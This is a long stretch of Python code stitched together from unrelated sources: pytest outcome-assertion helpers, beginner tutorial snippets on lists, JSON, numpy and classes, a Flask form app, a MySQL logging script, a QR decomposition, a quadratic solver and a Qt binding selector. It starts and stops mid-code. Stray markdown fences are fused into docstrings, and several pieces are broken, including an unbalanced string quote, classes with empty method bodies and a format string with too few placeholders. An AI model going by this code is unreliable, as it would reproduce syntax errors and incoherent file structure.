        Sequence[Union[CollectReport, TestReport]],
    ],
    passed: int = 0,
    skipped: int = 0,
    failed: int = 0,
) -> None:
    __tracebackhide__ = True

    realpassed, realskipped, realfailed = outcomes
    obtained = {
        "passed": len(realpassed),
        "skipped": len(realskipped),
        "failed": len(realfailed),
    }
    expected = {"passed": passed, "skipped": skipped, "failed": failed}
    assert obtained == expected, outcomes


def assert_outcomes(
    outcomes: Dict[str, int],
    passed: int = 0,
    skipped: int = 0,
    failed: int = 0,
    errors: int = 0,
    xpassed: int = 0,
    xfailed: int = 0,
) -> None:
    """Assert that the specified outcomes appear with the respective
    numbers (0 means it didn't occur) in the text output from a test run."""
    __tracebackhide__ = True

    obtained = {
        "passed": outcomes.get("passed", 0),
        "skipped": outcomes.get("skipped", 0),
        "failed": outcomes.get("failed", 0),
        "errors": outcomes.get("errors", 0),
        "xpassed": outcomes.get("xpassed", 0),
        "xfailed": outcomes.get("xfailed", 0),
    }
    expected = {
        "passed": passed,
        "skipped": skipped,
        "failed": failed,
        "errors": errors,
        "xpassed": xpassed,
        "xfailed": xfailed,
    }
    assert obtained == expected

# Pythagoras Formula
import math

# a.sq + b.sq = c.sq

a = float(input("Value for A : "))
b = float(input("Value for B : "))
c = math.sqrt(a ** 2 + b ** 2)
# here's the answer
print(c)

a = 33
b = 200

if b > a:
    pass

# having an empty if statement like this, would raise an error without the pass statement

import json

# some JSON:
x = '{ "name":"sanu", "age":24, "city":"batticaloa"}'

# parse x:
y = json.loads(x)

# the result is a Python dictionary:
print(y["age"])

from flask import Flask, render_template, request

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def form():
    return render_template("form.html")


@app.route("/hello", methods=["GET", "POST"])
def hello():
    return render_template(
        "greeting.html", say=request.form["say"], to=request.form["to"]
    )


if __name__ == "__main__":
    app.run()
```

```pyPython script Exporter class"""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from traitlets import default

from .templateexporter import TemplateExporter


class PythonExporter(TemplateExporter):
    """
    Exports a Python code file.
    Note that the file produced will have a shebang of '#!/usr/bin/env python'
    regardless of the actual python version used in the notebook.
    """
    @default('file_extension')
    def _file_extension_default(self):
        return '.py'

    @default('template_name')
    def _template_name_default(self):
        return 'python'

    output_mimetype = 'text/x-python'

thislist = ["apple", "banana", "cherry", "orange", "kiwi", "mango"]

thislist[1:3] = ["blackcurrant", "watermelon"]

print(thislist)

thislist = ["apple", "banana", "cherry", "orange", "kiwi", "mango"]

thislist[1:3] = ["blackcurrant", "watermelon"]

print(thislist)

import numpy as np

a = np.array(42)
b = np.array([1, 2, 3, 4, 5])
c = np.array([[1, 2, 3], [4, 5, 6]])
d = np.array([[[1, 2, 3], [4, 5, 6]], [[1, 2, 3], [4, 5, 6]]])

print(a.ndim)
print(b.ndim)
print(c.ndim)
print(d.ndim)

thistuple = ("apple", "banana", "cherry")
if "apple" in thistuple:
    print("Yes, 'apple' is in the fruits tuple")

thisdict = {"brand": "Ford", "model": "Mustang", "year": 1964}
if "model" in thisdict:
    print("Yes, 'model' is one of the keys in the thisdict dictionary")

txt = "The best things in life are free!"
if "expensive" not in txt:
    print("Yes, 'expensive' is NOT present.")

import numpy as np

if type(np.add) == np.ufunc:
    print("add is ufunc")
else:
    print("add is not ufunc")

import json

# a Python object (dict):
x = {"name": "sanu", "age": 24, "city": "batticaloa"}

# convert into JSON:
y = json.dumps(x)

# the result is a JSON string:
print(y)

import json

print(json.dumps({"name": "sanu", "age": 24}))
print(json.dumps(["apple", "bananas"]))
print(json.dumps(("apple", "bananas")))
print(json.dumps("hello"))
print(json.dumps(42))
print(json.dumps(31.76))
print(json.dumps(True))
print(json.dumps(False))
print(json.dumps(None))

import json

x = {
    "name": "sanu",
    "age": 324,
    "married": True,
    "divorced": False,
    "children": ("Ann", "Billy"),
    "pets": None,
    "cars": [{"model": "BMW 230", "mpg": 27.5}, {"model": "Ford Edge", "mpg": 24.1}],
}

# convert into JSON:
y = json.dumps(x)

# the result is a JSON string:
print(y)

import numpy as np


def myadd(x, y):
    return x + y


myadd = np.frompyfunc(myadd, 2, 1)

print(myadd([1, 2, 3, 4], [5, 6, 7, 8]))

class Person:
    def __init__(self, fname, lname):
        self.firstname = fname
        self.lastname = lname

    def printname(self):
        print(self.firstname, self.lastname)


class Student(Person):
    pass


x = Student("sanu", "santh")
x.printname()

class Person:
    def __init__(self, fname, lname):
        self.firstname = fname
        self.lastname = lname

    def printname(self):
        print(self.firstname, self.lastname)


# Use the Person class to create an object, and then execute the printname method:

x = Person("Sanus", "santh")
x.printname()

class MyNumbers:
    def __iter__(self):
        self.a = 1
        return self

    def __next__(self):
        x = self.a
        self.a += 1
        return x


myclass = MyNumbers()
myiter = iter(myclass)

print(next(myiter))
print(next(myiter))
print(next(myiter))
print(next(myiter))
print(next(myiter))

import numpy as np

arr = np.array([41, 42, 43, 44])

filter_arr = arr > 42

newarr = arr[filter_arr]

print(filter_arr)
print(newarr)

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6, 7])

filter_arr = arr % 2 == 0

newarr = arr[filter_arr]

print(filter_arr)
print(newarr)

import numpy as np

arr = np.array([41, 42, 43, 44])

# Create an empty list
filter_arr = []

# go through each element in arr
for element in arr:
    # if the element is higher than 42, set the value to True, otherwise False:
    if element > 42:
        filter_arr.append(True)
    else:
        filter_arr.append(False)

newarr = arr[filter_arr]

print(filter_arr)
print(newarr)

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6, 7])

# Create an empty list
filter_arr = []

# go through each element in arr
for element in arr:
    # if the element is completely divisble by 2, set the value to True, otherwise False
    if element % 2 == 0:
        filter_arr.append(True)
    else:
        filter_arr.append(False)

newarr = arr[filter_arr]

print(filter_arr)
print(newarr)

def myfunc(n):
    return abs(n - 50)


thislist = [100, 50, 65, 82, 23]

thislist.sort(key=myfunc)

print(thislist)

import json

x = {
    "name": "sanu",
    "age": 24,
    "married": True,
    "divorced": False,
    "children": ("Ann", "Billy"),
    "pets": None,
    "cars": [{"model": "BMW 230", "mpg": 27.5}, {"model": "Ford Edge", "mpg": 24.1}],
}

# use four indents to make it easier to read the result:
print(json.dumps(x, indent=4))

import json

x = {
    "name": "sanu",
    "age": 24,
    "married": True,
    "divorced": False,
    "children": ("Ann", "Billy"),
    "pets": None,
    "cars": [{"model": "BMW 230", "mpg": 27.5}, {"model": "Ford Edge", "mpg": 24.1}],
}

# use . and a space to separate objects, and a space, a = and a space to separate keys from their values:
print(json.dumps(x, indent=4, separators=(". ", " = ")))

from numpy import random
import numpy as np

arr = np.array([1, 2, 3, 4, 5])

print(random.permutation(arr))

car = {"brand": "Ford", "model": "Mustang", "year": 1964}

x = car.items()

print(x)  # before the change

car["year"] = 2020

print(x)  # after the change

car = {"brand": "Ford", "model": "Mustang", "year": 1964}

x = car.keys()

print(x)  # before the change

car["color"] = "white"

print(x)  # after the change

car = {"brand": "Ford", "model": "Mustang", "year": 1964}

x = car.values()

print(x)  # before the change

car["year"] = 2020

print(x)  # after the change

import numpy as np

arr = np.array([1, 2, 3, 4], ndmin=5)

print(arr)
print("number of dimensions :", arr.ndim)

import numpy as np

arr = np.array([np.pi / 2, np.pi / 3, np.pi / 4, np.pi / 5])

x = np.cosh(arr)

print(x)

def greeting(name):
    print("Hello, " + name)


person1 = {"name": "sanu", "age": 24, "country": "srilanka"}

import numpy as np

arr = np.array([1, 2, 3])

for x in np.nditer(arr, flags=["buffered"], op_dtypes=["S"]):
    print(x)

import numpy as np

arr = np.array([[1, 2, 3], [4, 5, 6]])

for x in arr:
    for y in x:
        print(y)

import numpy as np

arr = np.array([[[1, 2, 3], [4, 5, 6]], [[7, 8, 9], [10, 11, 12]]])

for x in arr:
    print("x represents the 2-D array:")
    print(x)

import numpy as np

arr = np.array([[[1, 2, 3], [4, 5, 6]], [[7, 8, 9], [10, 11, 12]]])

for x in arr:
    for y in x:
        for z in y:
            print(z)

import numpy as np

arr = np.array([[[1, 2], [3, 4]], [[5, 6], [7, 8]]])

for x in np.nditer(arr):
    print(x)

import numpy as np

arr = np.array([[1, 2, 3, 4], [5, 6, 7, 8]])

for x in np.nditer(arr[:, ::2]):
    print(x)

mytuple = ("apple", "banana", "cherry")
myit = iter(mytuple)

print(next(myit))
print(next(myit))
print(next(myit))

mystr = "banana"
myit = iter(mystr)

print(next(myit))
print(next(myit))
print(next(myit))
print(next(myit))
print(next(myit))
print(next(myit))

import numpy as np

arr1 = np.array([1, 2, 3])

arr2 = np.array([4, 5, 6])

arr = np.concatenate((arr1, arr2))

print(arr)

import numpy as np

arr1 = np.array([[1, 2], [3, 4]])

arr2 = np.array([[5, 6], [7, 8]])

arr = np.concatenate((arr1, arr2), axis=1)

print(arr)

x = {"apple", "banana", "cherry"}
y = {"google", "microsoft", "apple"}

x.symmetric_difference_update(y)

print(x)

x = {"apple", "banana", "cherry"}
y = {"google", "microsoft", "apple"}

z = x.symmetric_difference(y)

print(z)

def my_function(child3, child2, child1):
    print("The youngest child is " + child3)


my_function(child1="Emil", child2="Tobias", child3="Linus")

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]
newlist = []

for x in fruits:
    if "a" in x:
        newlist.append(x)

print(newlist)

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]
newlist = [x for x in fruits if "a" in x]

print(newlist)

# The try block will generate a NameError, because x is not defined:

try:
    print(x)
except NameError:
    print("Variable x is not defined")
except:
    print("Something else went wrong")

# The finally block gets executed no matter if the try block raises any errors or not:

try:
    print(x)
except:
    print("Something went wrong")
finally:
    print("The 'try except' is finished")

# The try block will raise an error when trying to write to a read-only file:

try:
    f = open("demofile.txt")
    f.write("Lorum Ipsum")
except:
    print("Something went wrong when writing to the file")
finally:
    f.close()

# The program can continue, without leaving the file object open

# The try block does not raise any errors, so the else block is executed:

try:
    print("Hello")
except:
    print("Something went wrong")
else:
    print("Nothing went wrong")

# Import math library
import math

# Round a number upward to its nearest integer
x = math.ceil(1.4)

# Round a number downward to its nearest integer
y = math.floor(1.4)

print(x)
print(y)

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def myfunc(self):
        print("Hello my name is " + self.name)


p1 = Person("sanus", 24)

p1.age = 40

print(p1.age)

a = """Lorem ipsum dolor sit amet,
consectetur adipiscing elit,
sed do eiusmod tempor incididunt
ut labore et dolore magna aliqua."""
print(a)

a = """Lorem ipsum dolor sit amet,
consectetur adipiscing elit,
sed do eiusmod tempor incididunt
ut labore et dolore magna aliqua."""
print(a)

from numpy import random

x = random.multinomial(n=6, pvals=[1 / 6, 1 / 6, 1 / 6, 1 / 6, 1 / 6, 1 / 6])

print(x)

myfamily = {
    "child1": {"name": "Emil", "year": 2004},
    "child2": {"name": "Tobias", "year": 2007},
    "child3": {"name": "Linus", "year": 2011},
}

print(myfamily)

child1 = {"name": "Emil", "year": 2004}
child2 = {"name": "Tobias", "year": 2007}
child3 = {"name": "Linus", "year": 2011}

myfamily = {"child1": child1, "child2": child2, "child3": child3}

print(myfamily)

x = 41

if x > 10:
    print("Above ten,")
    if x > 20:
        print("and also above 20!")
    else:
        print("but not above 20.")

import numpy as np

arr = np.array([1.1, 2.1, 3.1])

newarr = arr.astype("i")

print(newarr)
print(newarr.dtype)

import numpy as np

arr = np.array([1.1, 2.1, 3.1])

newarr = arr.astype(int)

print(newarr)
print(newarr.dtype)

import numpy as np

arr = np.array([1, 0, 3])

newarr = arr.astype(bool)

print(newarr)
print(newarr.dtype)

import numpy as np

arr1 = np.array([1, 2, 3, 4])
arr2 = np.array([5, 6, 7, 8])

x = np.prod([arr1, arr2])

print(x)

import numpy as np

arr1 = np.array([1, 2, 3])
arr2 = np.array([1, 2, 3])

newarr = np.add(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([1, 2, 3])
arr2 = np.array([1, 2, 3])

newarr = np.sum([arr1, arr2])

print(newarr)

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def myfunc(self):
        print("Hello my name is " + self.name)


p1 = Person("sanus", 24)
p1.myfunc()

import json

x = {
    "name": "sanu",
    "age": 24,
    "married": True,
    "divorced": False,
    "children": ("Ann", "Billy"),
    "pets": None,
    "cars": [{"model": "BMW 230", "mpg": 27.5}, {"model": "Ford Edge", "mpg": 24.1}],
}

# sort the result alphabetically by keys:
print(json.dumps(x, indent=4, sort_keys=True))

def my_function(food):
    for x in food:
        print(x)


fruits = ["apple", "banana", "cherry"]

my_function(fruits)

import numpy as np

arr1 = np.array([1, 2, 3, 4])
arr2 = np.array([5, 6, 7, 8])

newarr = np.prod([arr1, arr2], axis=1)

print(newarr)

from numpy import random
import numpy as np

arr = np.array([1, 2, 3, 4, 5])

random.shuffle(arr)

print(arr)

thistuple = ("apple", "banana", "cherry", "orange", "kiwi", "melon", "mango")
print(thistuple[2:5])

# This will return the items from position 2 to 5.

# Remember that the first item is position 0,
# and note that the item in position 5 is NOT included

thistuple = ("apple", "banana", "cherry", "orange", "kiwi", "melon", "mango")
print(thistuple[2:5])

# This will return the items from position 2 to 5.

# Remember that the first item is position 0,
# and note that the item in position 5 is NOT included

thistuple = ("apple", "banana", "cherry", "orange", "kiwi", "melon", "mango")
print(thistuple[-4:-1])

# Negative indexing means starting from the end of the tuple.

# This example returns the items from index -4 (included) to index -1 (excluded)

# Remember that the last item has the index -1,

def tri_recursion(k):
    if k > 0:
        result = k + tri_recursion(k - 1)
        print(result)
    else:
        result = 0
    return result


print("\n\nRecursion Example Results")
tri_recursion(6)

thistuple = ("apple", "banana", "cherry")
y = list(thistuple)
y.remove("apple")
thistuple = tuple(y)

print(thistuple)

thislist = ["apple", "banana", "cherry"]
del thislist
print(
    thislist
)  # this will cause an error because you have succsesfully deleted "thislist".

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12])

newarr = arr.reshape(4, 3)

print(newarr)

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12])

newarr = arr.reshape(2, 3, 2)

print(newarr)

set1 = {"apple", "banana", "cherry"}
set2 = {1, 5, 7, 9, 3}
set3 = {True, False, False}

print(set1)
print(set2)
print(set3)

x = frozenset(("apple", "banana", "cherry"))

# display x:
print(x)

# display the data type of x:
print(type(x))

x = list(("apple", "banana", "cherry"))

# display x:
print(x)

# display the data type of x:
print(type(x))

x = set(("apple", "banana", "cherry"))

# display x:
print(x)

# display the data type of x:
print(type(x))

x = tuple(("apple", "banana", "cherry"))

# display x:
print(x)

# display the data type of x:
print(type(x))

import numpy as np

arr1 = np.array([10, 11, 12, 13, 14, 15])
arr2 = np.array([20, 21, 22, 23, 24, 25])

newarr = np.add(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([3, 5, 10, 8, 2, 33])

newarr = np.divide(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([20, 21, 22, 23, 24, 25])

newarr = np.multiply(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([3, 5, 6, 8, 2, 33])

newarr = np.power(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([3, 7, 9, 8, 2, 33])

newarr = np.divmod(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([3, 7, 9, 8, 2, 33])

newarr = np.mod(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([3, 7, 9, 8, 2, 33])

newarr = np.remainder(arr1, arr2)

print(newarr)

import numpy as np

arr1 = np.array([10, 20, 30, 40, 50, 60])
arr2 = np.array([20, 21, 22, 23, 24, 25])

newarr = np.subtract(arr1, arr2)

print(newarr)

print(bool(False))
print(bool(None))
print(bool(0))
print(bool(""))
print(bool(()))
print(bool([]))
print(bool({}))

thislist = ["orange", "mango", "kiwi", "pineapple", "banana"]

thislist.sort(reverse=True)

print(thislist)

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6])

newarr = np.array_split(arr, 3)

print(newarr[0])
print(newarr[1])
print(newarr[2])

import numpy as np

arr = np.array([[1, 2], [3, 4], [5, 6], [7, 8], [9, 10], [11, 12]])

newarr = np.array_split(arr, 3)

print(newarr)

import numpy as np

arr = np.array(
    [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12], [13, 14, 15], [16, 17, 18]]
)

newarr = np.array_split(arr, 3)

print(newarr)

import numpy as np

arr = np.array(
    [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12], [13, 14, 15], [16, 17, 18]]
)

newarr = np.array_split(arr, 3, axis=1)

print(newarr)

import numpy as np

arr = np.array(
    [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12], [13, 14, 15], [16, 17, 18]]
)

newarr = np.hsplit(arr, 3)

print(newarr)

import numpy as np

arr1 = np.array([1, 2, 3])

arr2 = np.array([4, 5, 6])

arr = np.vstack((arr1, arr2))

print(arr)

import numpy as np

arr1 = np.array([1, 2, 3])

arr2 = np.array([4, 5, 6])

arr = np.dstack((arr1, arr2))

print(arr)

import numpy as np

arr1 = np.array([1, 2, 3])

arr2 = np.array([4, 5, 6])

arr = np.hstack((arr1, arr2))

print(arr)

class MyNumbers:
    def __iter__(self):
        self.a = 1
        return self

    def __next__(self):
        if self.a <= 20:
            x = self.a
            self.a += 1
            return x
        else:
            raise StopIteration


myclass = MyNumbers()
myiter = iter(myclass)

for x in myiter:
    print(x)

import numpy as np

arr1 = np.array([1, 2, 3])
arr2 = np.array([1, 2, 3])

newarr = np.sum([arr1, arr2], axis=1)

print(newarr)

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]

newlist = [x for x in fruits if x != "apple"]

print(newlist)

thisset = set(("apple", "banana", "cherry"))
print(thisset)
# Note: the set list is unordered, so the result will display the items in a random order.

import numpy as np

arr = np.array([np.pi / 2, np.pi / 3, np.pi / 4, np.pi / 5])

x = np.sin(arr)

print(x)

tuple1 = ("apple", "banana", "cherry")
tuple2 = (1, 5, 7, 9, 3)
tuple3 = (True, False, False)

print(tuple1)
print(tuple2)
print(tuple3)

import numpy as np

arr = np.array([1, 2, 3, 4, 5, 6, 7, 8])

newarr = arr.reshape(2, 2, -1)

print(newarr)

fruits = ("apple", "banana", "cherry")

(green, yellow, red) = fruits

print(green)
print(yellow)
print(red)

class Person:
  def __init__(self, fname, lname):
    self.firstname = fname
    self.lastname = lname

  def printname(self):
    print(self.firstname, self.lastname)

class Student(Person):
  def __init__(self, fname, lname):
    super().__init__(fname, lname)

x = Student("sanu", santh")
x.printname()

fruits = ("apple", "banana", "cherry", "strawberry", "raspberry")

(green, yellow, *red) = fruits

print(green)
print(yellow)
print(red)

fruits = ("apple", "mango", "papaya", "pineapple", "cherry")

(green, *tropic, red) = fruits

print(green)
print(tropic)
print(red)

thislist = ["apple", "banana", "cherry"]
i = 0
while i < len(thislist):
    print(thislist[i])
    i = i + 1

thistuple = ("apple", "banana", "cherry")
i = 0
while i < len(thistuple):
    print(thistuple[i])
    i = i + 1

class Person:
    pass


# having an empty class definition like this, would raise an error without the pass statement

thisset = {"apple", "banana", "cherry"}
print(thisset)

# Note: the set list is unordered, meaning: the items will appear in a random order.

# Refresh this page to see the change in the result.

import re

text = "Adela, hi!"
# def csOppositeReverse(txt):
#   for i in range(len(txt)):
#     if re.match("^[a-z]+$", txt[i]):
#        txt[i] = txt[i].upper()
#        return txt[::-1]
#     elif re.match("^[A-Z]+$", txt[i]):
#       txt[i] = txt[i].lower()
#       return txt[::-1]


def csOppositeReverse(txt):
    return txt.swapcase()[::-1]


print(csOppositeReverse(text))

# puterea a doua a fiecarui digit intr un numar
def csSquareAllDigits(n):
    return int("".join(str(int(i) ** 2) for i in str(n)))


# take out the vowels of a string
import re


def csRemoveTheVowels(txt):
    # vowels = ["a", "e", "i", "o", "u"]
    # return "".join([l for l in txt if l not in vowels])
    return re.sub(r"[AEIOU]", "", txt, flags=re.IGNORECASE)


print(csRemoveTheVowels(text))

from cx_Freeze import setup, Executable

# file must be saved in same directory as the file you want to Compile
# Download cx_Freeze from source forge or run easy_install in power shell

nameOfExec = input("Name for Executable: ")
versionNumber = input("Version: ")
auth = input("Name of Author: ")
auth_email = input("Email of Author: ")
descript = input("Description: ")
filename = input("File to Compile(Add .py to file): ")

# run this file in cmd "python CompileFiles.py build" or "python CompileFiles.py build_exe"
# This setup in minimialistic

setup(
    name=nameOfExec,
    version=versionNumber,
    description=descript,
    author=auth,
    author_email=auth_email,
    executables=[Executable(filename)],
)

adj = ["red", "big", "tasty"]
fruits = ["apple", "banana", "cherry"]

for x in adj:
    for y in fruits:
        print(x, y)

for x in [0, 1, 2]:
    pass

# having an empty for loop like this, would raise an error without the pass statement

def myfunction():
    pass


# having an empty function definition like this, would raise an error without the pass statement

import mysql.connector
from mysql.connector import errorcode

config = {"user": "root", "password": "", "host": "localhost", "database": "acme"}

db = mysql.connector.connect(**config)
cursor = db.cursor()

DB_NAME = "acme"

TABLES = {}

TABLES["logs"] = (
    "CREATE TABLE `logs` ("
    " `id` int(11) NOT NULL AUTO_INCREMENT,"
    " `text` varchar(250) NOT NULL,"
    " `user` varchar(250) NOT NULL,"
    " `created` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,"
    " PRIMARY KEY (`id`)"
    ") ENGINE=InnoDB"
)


def create_database():
    cursor.execute(
        "CREATE DATABASE IF NOT EXISTS {} DEFAULT CHARACTER SET 'utf8'".format(DB_NAME)
    )
    print("Database {} created!".format(DB_NAME))


def create_tables():
    cursor.execute("USE {}".format(DB_NAME))

    for table_name in TABLES:
        table_description = TABLES[table_name]
        try:
            print("Creating table ({}) ".format(table_name), end="")
            cursor.execute(table_description)
        except mysql.connector.Error as err:
            if err.errno == errorcode.ER_TABLE_EXISTS_ERROR:
                print("Already Exists")
            else:
                print(err.msg)


create_database()
create_tables()


def add_log(text, user):
    sql = "INSERT INTO logs(text, user) VALUES (%s, %s)"
    cursor.execute(sql, (text, user))
    db.commit()
    log_id = cursor.lastrowid
    print("Added log {}".format(log_id))


def get_logs():
    sql = "SELECT * FROM logs ORDER BY created DESC"
    cursor.execute(sql)
    result = cursor.fetchall()

    for row in result:
        print(row[1])


def get_log(id):
    sql = "SELECT * FROM logs WHERE id = %s"
    cursor.execute(sql, (id,))
    result = cursor.fetchone()

    for row in result:
        print(row)


def update_log(id, text):
    sql = "UPDATE logs SET text = %s WHERE id = %s"
    cursor.execute(sql, (text, id))
    db.commit()
    print("Log updated")


def delete_log(id):
    sql = "DELETE FROM logs WHERE id = %s"
    cursor.execute(sql, (id,))
    db.commit()
    print("Log removed")


# add_log('This is log one', 'Brad')
# add_log('This is log two', 'Jeff')
# add_log('This is log three', 'Jane')

# get_logs()
# get_log(2)

# update_log(2, 'Updated log')

# delete_log(2)
# get_logs()

import numpy as np

arr = np.array([[1, 2, 3, 4, 5], [6, 7, 8, 9, 10]])

print("Last element from 2nd dim: ", arr[1, -1])

import numpy as np

arr = np.array([[1, 2, 3, 4, 5], [6, 7, 8, 9, 10]])

print("2nd element on 1st dim: ", arr[0, 1])

import numpy as np

arr = np.array([[1, 2, 3, 4, 5], [6, 7, 8, 9, 10]])

print("5th element on 2nd dim: ", arr[1, 4])

import numpy as np

arr = np.array([[[1, 2, 3], [4, 5, 6]], [[7, 8, 9], [10, 11, 12]]])

print(arr[0, 1, 2])

import matplotlib.pyplot as plt
import seaborn as sns

sns.distplot([0, 1, 2, 3, 4, 5], hist=False)

plt.show()

class Person:
    def __init__(mysillyobject, name, age):
        mysillyobject.name = name
        mysillyobject.age = age

    def myfunc(abc):
        print("Hello my name is " + abc.name)


p1 = Person("sanus", 24)
p1.myfunc()

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]

newlist = [x.upper() for x in fruits]

print(newlist)

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]

newlist = ["hello" for x in fruits]

print(newlist)

fruits = ["apple", "banana", "cherry", "kiwi", "mango"]

newlist = [x if x != "banana" else "orange" for x in fruits]

print(newlist)

import numpy as np

arr1 = np.array([1, 2, 3])

arr2 = np.array([4, 5, 6])

arr = np.stack((arr1, arr2), axis=1)

print(arr)

i = 0
while i < 6:
    i += 1
    if i == 3:
        continue
    print(i)

# Note that number 3 is missing in the result

class Stack:
  def __init__(self):
    self.storage = []

  def push(self, item):
    """
    push the item on to the top of the stack
    """
    self.storage.append(item)

  def pop(self):
    """
    pop the item from the top of the stack returning said item if there is anything on the stack.
    otherwise return "The Stack is Empty"
    """
    if len(self.storage) > 0:
      return self.storage.pop()
    return "The Stack is Empty"

  def peek(self):
    if len(self.storage) > 0:
      return self.storage[-1]
    return "The Stack is Empty"


s = Stack()
s.push(10)
s.push(20)
s.push(30)
l = []
l.append(s.pop())
l.append(s.pop())
l.append(s.pop())
print(l)

class Queue:
    def __init__(self):
        self.storage = []

    def enqueue(self, item):
        self.storage.append(item)

    def pop(self):
        if len(self.storage) > 0:
            return self.storage.pop()
        return "The Stack is Empty"


class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        if not self.items:
            return None
        return self.items.pop()

    def peek(self):
        if not self.items:
            return None
        return self.items[-1]


class MaxStack:
    def __init__(self):
    def push(self, item):
    def pop(self):
    def get_max(self):


class Stack:
    def __init__(self):
        self.data = []

    def push(self, item):
        self.data.append(item)

    def pop(self):
        if len(self.data) > 0:
            return self.data.pop()
        return "The stack is empty"


class QueueTwoStacks:
    def __init__(self):
    def enqueue(self, item):
    def dequeue(self):

import numpy as np


def qr_householder(A):
    """Return a QR-decomposition of the matrix A using Householder reflection.

    The QR-decomposition decomposes the matrix A of shape (m, n) into an
    orthogonal matrix Q of shape (m, m) and an upper triangular matrix R of
    shape (m, n).  Note that the matrix A does not have to be square.  This
    method of decomposing A uses the Householder reflection, which is
    numerically stable and of complexity O(n^3).

    https://en.wikipedia.org/wiki/QR_decomposition#Using_Householder_reflections

    Arguments:
    A -- a numpy.ndarray of shape (m, n)

    Note: several optimizations can be made for numeric efficiency, but this is
    intended to demonstrate how it would be represented in a mathematics
    textbook.  In cases where efficiency is particularly important, an optimized
    version from BLAS should be used.

    >>> A = np.array([[12, -51, 4], [6, 167, -68], [-4, 24, -41]], dtype=float)
    >>> Q, R = qr_householder(A)

    >>> # check that the decomposition is correct
    >>> np.allclose(Q@R, A)
    True

    >>> # check that Q is orthogonal
    >>> np.allclose(Q@Q.T, np.eye(A.shape[0]))
    True
    >>> np.allclose(Q.T@Q, np.eye(A.shape[0]))
    True

    >>> # check that R is upper triangular
    >>> np.allclose(np.triu(R), R)
    True
    """
    m, n = A.shape
    t = min(m, n)
    Q = np.eye(m)
    R = A.copy()

    for k in range(t - 1):
        # select a column of modified matrix A':
        x = R[k:, [k]]
        # construct first basis vector
        e1 = np.zeros_like(x)
        e1[0] = 1.0
        # determine scaling factor
        alpha = np.linalg.norm(x)
        # construct vector v for Householder reflection
        v = x + np.sign(x[0]) * alpha * e1
        v /= np.linalg.norm(v)

        # construct the Householder matrix
        Q_k = np.eye(m - k) - 2.0 * v @ v.T
        # pad with ones and zeros as necessary
        Q_k = np.block([[np.eye(k), np.zeros((k, m - k))], [np.zeros((m - k, k)), Q_k]])

        Q = Q @ Q_k.T
        R = Q_k @ R

    return Q, R


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Copyright © Spyder Project Contributors
# Licensed under the terms of the MIT License
# (see spyder/__init__.py for details)
```

```pyQString compatibility."""


def qstring_length(text):
    """
    Tries to compute what the length of an utf16-encoded QString would be.
    """
    utf16_text = text.encode('utf16')
    length = len(utf16_text) // 2
    # Remove Byte order mark.
    # TODO: All unicode Non-characters should be removed
    if utf16_text[:2] in [b'\xff\xfe', b'\xff\xff', b'\xfe\xff']:
        length -= 1
    return length
```

````py A Qt API selector that can be used to switch between PyQt and PySide.

This uses the ETS 4.0 selection pattern of:
PySide first, PyQt with API v2. second.

Do not use this if you need PyQt with the old QString/QVariant API.```


```py

import os

from pydev_ipython.qt_loaders import (load_qt, QT_API_PYSIDE,
                                         QT_API_PYQT, QT_API_PYQT5)

QT_API = os.environ.get('QT_API', None)
if QT_API not in [QT_API_PYSIDE, QT_API_PYQT, QT_API_PYQT5, None]:
    raise RuntimeError("Invalid Qt API %r, valid values are: %r, %r" %
                       (QT_API, QT_API_PYSIDE, QT_API_PYQT, QT_API_PYQT5))
if QT_API is None:
    api_opts = [QT_API_PYSIDE, QT_API_PYQT, QT_API_PYQT5]
else:
    api_opts = [QT_API]

QtCore, QtGui, QtSvg, QT_API = load_qt(api_opts)

from __future__ import annotations

from cmath import sqrt


def quadratic_roots(a: int, b: int, c: int) -> tuple[complex, complex]:
    """
    Given the numerical coefficients a, b and c,
    calculates the roots for any quadratic equation of the form ax^2 + bx + c

    >>> quadratic_roots(a=1, b=3, c=-4)
    (1.0, -4.0)
    >>> quadratic_roots(5, 6, 1)
    (-0.2, -1.0)
    >>> quadratic_roots(1, -6, 25)
    ((3+4j), (3-4j))
    """

    if a == 0:
        raise ValueError("Coefficient 'a' must not be zero.")
    delta = b * b - 4 * a * c

    root_1 = (-b + sqrt(delta)) / (2 * a)
    root_2 = (-b - sqrt(delta)) / (2 * a)

    return (
        root_1.real if not root_1.imag else root_1,
        root_2.real if not root_2.imag else root_2,
    )


def main():
    solution1, solution2 = quadratic_roots(a=5, b=6, c=1)
    print(f"The solutions are: {solution1} and {solution2}")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3

from .hash_table import HashTable


class QuadraticProbing(HashTable):
    """
